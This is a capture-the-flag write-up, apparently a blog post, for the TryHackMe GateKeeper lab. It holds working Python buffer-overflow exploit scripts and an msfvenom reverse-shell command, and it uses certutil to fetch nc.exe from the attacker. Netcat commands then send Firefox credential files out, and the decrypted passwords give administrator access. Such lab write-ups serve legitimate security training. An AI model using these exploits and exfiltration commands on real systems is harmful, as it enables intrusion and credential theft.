---
layout: single
title: GateKeeper - TryHackMe (OSCP STYLE)
excerpt: "Can you get past the gate and through the fire?

This machine from the buffer overflow group presents us with two challenges: discovering a buffer overflow in an application and escalating privileges. The only hint I'm going to give you is that enumeration and lateral thinking are important."
date: 2023-06-06
classes: wide
header:
  teaser: /assets/images/gatekeeper/portada.png
  teaser_home_page: true
categories:
  - TryHackMe
  - infosec
tags:
  - TryHackMe
  - windows
  - BufferOverflow
  - BrowserCache
---
## Enumeration

As in all write-ups, I start by enumerating the machine with Nmap, where I discover several open ports.

```
sudo nmap -p- -sS --min-rate 5000 -T5 -vvv --open -n -Pn 10.10.239.194 -oG allPorts
```

![20]

  
We found different open ports, but two of them caught my attention: port 445 and port 31337.

  
After searching on Google, we discovered that port 31337 is a port commonly used by hackers to establish persistence. Conducting a basic reconnaissance script using Nmap, we found that this port handles TCP requests. On the other hand, we found that port 445 runs an SMB service, which we can enumerate with nmap

![21]]

We found that the directory users has Read permissions for Unknown users so we can list this directory

```
smbclient //10.10.239.194/Users
```

![22]

If we navigate to share folder found our buffer overflow application, we just need to download it with the get command and start testing with Immunity Debuger

![23]


## Initial Access

Once we have access to the executable, we can use a machine with Immunity Debugger installed to debug the application and gradually break it down until we achieve access.

![1]

To set the working directory with Mona, you can use the following command:

```
!mona config -set workingfolder c:\mona\%p
```

To solve this machine, I have created several Python scripts that I will leave in a repository on my GitHub.

First, we are going to use a fuzzer that will send a specific number of bytes to make the application crash. If you are unable to crash it, you would need to increase the number of bytes until the application can no longer handle it.

```
#!/usr/bin/env python3
import socket

RHOST = "10.10.154.152"
RPORT = 31337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

buf = ""
buf += "A"*1024
buf += "\n"

s.send(bytes(buf, "latin-1"))
```


![2]

If we know that the application crashes with 1024 bytes, we can use the pattern_create tool to generate a pattern of that size.

![19]

To find the offset at which the application consistently crashes when we send a request, we can use the following command with Mona:

```
!mona findmsp -distance 1024
```

![3]
We know that the offset is 146. Let's create a Python script where we will add the offset and try to set the value of EIP to all Bs (42424242).

```
#!/usr/bin/env python3
import socket

RHOST = "10.10.154.152"
RPORT = 31337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

buf = ""
buf += "A" * 146 + "BBBB" + "C" * 300
buf += "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0B "
buf += "\n"

s.send(bytes(buf, "latin-1"))
```

![[Imagenes/GateKeeper/4]

Now we'll find the bad chars characters 

```
#!/usr/bin/env python3
import socket

RHOST = "10.10.154.152"
RPORT = 31337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

buf = ""
buf += "A" * 146 + "BBBB" + "C" * 10
buf +=("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
buf += "\n"

s.send(bytes(buf, "latin-1"))
```

We have to copy the ESP value and compare with the original bytearray file in order to find badchars

```
!mona compare -f C:\mona\oscp\bytearray.bin -a <address>
```

![5]

![6]

The next step is find a Jump point, since we don't have bad chars because we can asume that \x01 is a corrupted byte

```
!mona jmp -r esp -cpb "\x00"
```

In our case we have 2 jump points 

![7]
Remember that W7 has little endian notation so we have to reverse it:

```
W7 Notation: 080414C3
Converted notation: \xc3\x14\x04\x08
```

With just need to add the msfvenom generated shell code that call a reverse shell in a listening port, to our script

```
#!/usr/bin/env python2
import socket

RHOST = "10.10.154.152"
RPORT = 31337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

shellcode = ()

buf = ""
buf += "A" * 146 + "\xc3\x14\x04\x08" + "\x90" * 16 + shellcode  
buf += "\n"

s.send(bytes(buf, "latin-1"))
```

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.18.59.189 LPORT=4444 EXITFUNC=thread -b "\x00" -f c
```

![8]

We gain access in the local machine where we are testing this exploit, the only thing that we have to do is change the destination IP and probe it withe the Gatekeeper machine

![9]

Finally we got access

![10]

![11]

## Privilege Escalation

In the directory we found 1 interesting file called Firefox.lnk

![12]

The first thing that I found in the machine was that the kernel is outdated, but after trying for hours to get a successful priv escalation through it, I re-enumerate the machine and found the Firefox.lnk file

At this time a found a technique called retrieving credentials from browser caches, in Jr Penetration Tester path there are similar techniques 

In google I found that the path where Firefox could store cache credentials is :
```
c:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles
```

if you notice there is a directory called `ljfn812a.default-release` serach about on google you will find this folder save the browser logins let's see what this folder content

![13]

The 2 interesting files that can contain passwords are key4.db and logins.json, there is a python tool that can be helpful to decryp thos files

[Firepwd](https://github.com/lclevy/firepwd)

To transfer thos files to our machine we have to upload `nc.exe` through certutil.exe tool

```
certutil.exe -f -urlcache -split http://10.18.59.189:8000/nc.exe
```

![14]

```
nc.exe -nv 10.18.59.189 4444 < key4.db
nc.exe -nv 10.18.59.189 4444 < logins.json
```

![15]

We just need execute firepwd with python3 and we get the credentials

![16]

When we have a Windows system with the SMB service enabled, we can establish a connection to it using credentials through a tool called psexec.

![17]

Finally we get access as adminstrator and we can retrieve the last flag, 

![18]

[1]:/assets/images/gatekeeper/1.png
[2]:/assets/images/gatekeeper/2.png
[3]:/assets/images/gatekeeper/3.png
[4]:/assets/images/gatekeeper/4.png
[5]:/assets/images/gatekeeper/5.png
[6]:/assets/images/gatekeeper/6.png
[7]:/assets/images/gatekeeper/7.png
[8]:/assets/images/gatekeeper/8.png
[9]:/assets/images/gatekeeper/9.png
[10]:/assets/images/gatekeeper/10.png
[11]:/assets/images/gatekeeper/11.png
[12]:/assets/images/gatekeeper/12.png
[13]:/assets/images/gatekeeper/13.png
[14]:/assets/images/gatekeeper/14.png
[15]:/assets/images/gatekeeper/15.png
[16]:/assets/images/gatekeeper/16.png
[17]:/assets/images/gatekeeper/17.png
[18]:/assets/images/gatekeeper/18.png
[19]:/assets/images/gatekeeper/19.png
[20]:/assets/images/gatekeeper/20.png
[21]:/assets/images/gatekeeper/21.png
[22]:/assets/images/gatekeeper/22.png
[23]:/assets/images/gatekeeper/23.png
